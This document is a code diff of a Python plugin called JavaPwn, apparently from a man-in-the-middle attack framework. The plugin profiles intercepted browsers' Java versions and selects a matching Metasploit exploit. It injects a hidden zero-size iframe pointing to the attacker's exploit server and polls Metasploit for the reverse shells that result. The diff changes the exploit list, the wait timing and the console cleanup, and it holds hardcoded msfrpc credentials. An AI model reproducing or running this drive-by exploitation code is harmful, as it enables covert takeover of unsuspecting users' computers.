@@ -30,10 +30,7 @@ class JavaPwn(BrowserProfiler, Plugin):
         self.javaVersionDic = {1.702: "java_atomicreferencearray",
                                1.704: "java_verifier_field_access",
                                1.706: "java_jre17_exec",
-                               1.707: "java_jre17_jaxws",
-                               1.7010: "java_jre17_jmxbean",
-                               1.7017: "java_jre17_driver_manager",
-                               1.7021: "java_storeimagearray"}
+                               1.707: "java_jre17_jaxws"}
                                #add your exploits here converting the max affected java version to a float (e.g. java version 1.7.05 => 1.705)
 
         self.sploited_ips = [] # store ip of pwned or not vulnarable clients so we don't re-exploit
@@ -63,21 +60,21 @@ class JavaPwn(BrowserProfiler, Plugin):
 
     def injectWait(self, msfinstance, url, client_ip): #here we inject an iframe to trigger the exploit and check for resulting sessions
         #inject iframe
-        logging.info("%s >> \t now injecting iframe to trigger exploit" % client_ip)
+        logging.info("%s >> now injecting iframe to trigger exploit" % client_ip)
         self.html_payload = "<iframe src='http://%s:%s%s' height=0%% width=0%%></iframe>" % (self.msfip, self.msfport, url) #temporarily changes the code that the Browserprofiler plugin injects
                         
-        logging.info('%s >> \t waiting for ze shells, Please wait...' % client_ip)
+        logging.info('%s >> waiting for ze shells, Please wait...' % client_ip)
                         
         exit = False
         i = 1
-        while i <= 15: #wait max 30 seconds for a new shell
+        while i <= 30: #wait max 60 seconds for a new shell
             if exit == True:
                 break
             shell = msfinstance.call('session.list') #poll metasploit every 2 seconds for new sessions
             if len(shell) > 0:
                 for k,v in shell.items():
                     if client_ip in shell[k]['tunnel_peer']: #make sure the shell actually came from the ip that we targeted
-                        logging.info("%s >> \t Got shell!" % client_ip)
+                        logging.info("%s >> Got shell!" % client_ip)
                         self.sploited_ips.append(client_ip) #target successfuly exploited
                         exit = True
                         break
@@ -85,8 +82,9 @@ class JavaPwn(BrowserProfiler, Plugin):
             i+=1
         
         if exit == False: #We didn't get a shell
-            logging.info("%s >> \t session not established after 30 seconds" % client_ip)
+            logging.info("%s >> session not established after 30 seconds" % client_ip)
 
+        
         self.html_payload = self.get_payload() # restart the BrowserProfiler plugin
 
     def pwn(self, msfinstance):
@@ -101,8 +99,8 @@ class JavaPwn(BrowserProfiler, Plugin):
 
                     client_version = self.version2float(brwprofile['java_version']) #convert the clients java string version to a float
 
-                    logging.info("%s client has java version %s installed! Proceeding..." % (vic_ip, brwprofile['java_version']))
-                    logging.info("%s >> \t Choosing exploit based on version string" % vic_ip)
+                    logging.info("%s >> client has java version %s installed! Proceeding..." % (vic_ip, brwprofile['java_version']))
+                    logging.info("%s >> Choosing exploit based on version string" % vic_ip)
 
                     min_version = min(self.javaVersionDic, key=lambda x: abs(x-client_version)) #retrives the exploit with minimum distance from the clients version
                     
@@ -110,7 +108,7 @@ class JavaPwn(BrowserProfiler, Plugin):
                         
                         exploit = self.javaVersionDic[min_version] #get the exploit string for that version
                         
-                        logging.info("%s >> \t client is vulnerable to %s!" % (vic_ip, exploit))
+                        logging.info("%s >> client is vulnerable to %s!" % (vic_ip, exploit))
 
                         msf = msfinstance
                         
@@ -120,7 +118,7 @@ class JavaPwn(BrowserProfiler, Plugin):
                             for k,v in jobs.items():
                                 info = msf.call('job.info', [k])
                                 if exploit in info['name']: 
-                                    logging.info('%s >> \t %s exploit already started' % (vic_ip, exploit))
+                                    logging.info('%s >> %s exploit already started' % (vic_ip, exploit))
                                     url = info['uripath'] #get the url assigned to the exploit
                                     self.injectWait(msf, url, vic_ip)
                         
@@ -142,7 +140,7 @@ class JavaPwn(BrowserProfiler, Plugin):
                             logging.debug("command string:\n%s" % cmd)
 
                             try:
-                                logging.info("%s >> \t sending commands to metasploit" % vic_ip)                 
+                                logging.info("%s >> sending commands to metasploit" % vic_ip)                 
                             
                                 #Create a virtual console
                                 console_id = msf.call('console.create')['id']
@@ -150,14 +148,13 @@ class JavaPwn(BrowserProfiler, Plugin):
                                 #write the cmd to the newly created console
                                 msf.call('console.write', [console_id, cmd])
                             
-                                logging.info("%s >> \t commands sent succesfully" % vic_ip)
+                                logging.info("%s >> commands sent succesfully" % vic_ip)
                             except Exception, e:
-                                logging.info('%s >> \t Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))
+                                logging.info('%s >> Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))
 
-                            self.injectWait(msf, rand_url, vic_ip)
-                            msfinstance.call('console.destroy', [console_id]) #destroy the virtual console          
+                            self.injectWait(msf, rand_url, vic_ip)          
                     else:
-                        logging.info("%s >> \t client is not vulnerable to any java exploit" % vic_ip)
+                        logging.info("%s >> client is not vulnerable to any java exploit" % vic_ip)
                         self.sploited_ips.append(vic_ip)
                         sleep(0.5)
                 else:
@@ -174,10 +171,13 @@ class JavaPwn(BrowserProfiler, Plugin):
         msf = msfrpc.Msfrpc({})
         msf.login('msf', 'abc123')
         jobs = msf.call('job.list')
-        print '[*] Stopping all running metasploit jobs'
         if len(jobs) > 0:
+            print '[*] Stopping all running metasploit jobs'
             for k,v in jobs.items():
                 msf.call('job.stop', [k])
 
-
-       
+        consoles = msf.call('console.list')['consoles']
+        if len(consoles) > 0:
+            print "[*] Closing all virtual consoles"
+            for b,i,p in consoles.items():
+                msf.call('console.destroy', [i])
